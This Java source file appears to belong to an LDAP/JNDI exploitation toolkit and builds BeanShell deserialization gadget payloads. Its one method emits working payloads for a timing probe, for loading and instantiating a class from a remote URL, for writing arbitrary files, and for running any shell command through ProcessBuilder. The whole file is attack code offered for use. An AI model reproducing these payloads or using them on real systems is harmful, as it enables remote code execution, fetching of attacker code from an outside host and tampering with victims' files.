package com.feihong.ldap.gadgets.utils.beanshell;

import com.feihong.ldap.gadgets.utils.Utils;
import com.feihong.ldap.gadgets.utils.Strings ;

import java.util.Arrays;

public class BeanShellUtil {

    public static String makeBeanShellPayload(String command) {
        if (command.startsWith("TS-"))
            return "compare(Object su18, Object su19) { return new Integer(1);}java.lang.Thread.sleep(" + (Integer.parseInt(command.split("[-]")[1]) * 1000) + "L);";
        if (command.startsWith("RC-")) {
            String[] strings = Utils.handlerCommand(command);
            return "compare(Object su18, Object su19) { return new Integer(1);}new URLClassLoader(new URL[]{new URL(\"" + strings[0] + "\")}).loadClass(\"" + strings[1] + "\").newInstance();";
        }
        if (command.startsWith("WF-")) {
            String[] strings = Utils.handlerCommand(command);
            return "compare(Object su18, Object su19) { return new Integer(1);}new java.io.FileOutputStream(\"" + strings[0] + "\").write(\"" + strings[1] + "\".getBytes());";
        }

        return "compare(Object su18, Object su19) {new java.lang.ProcessBuilder(new String[]{" +
                Strings.join(
                        Arrays.asList(command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"").split(" ")), ",", "\"", "\"") + "}).start();return new Integer(1);}";
    }

}
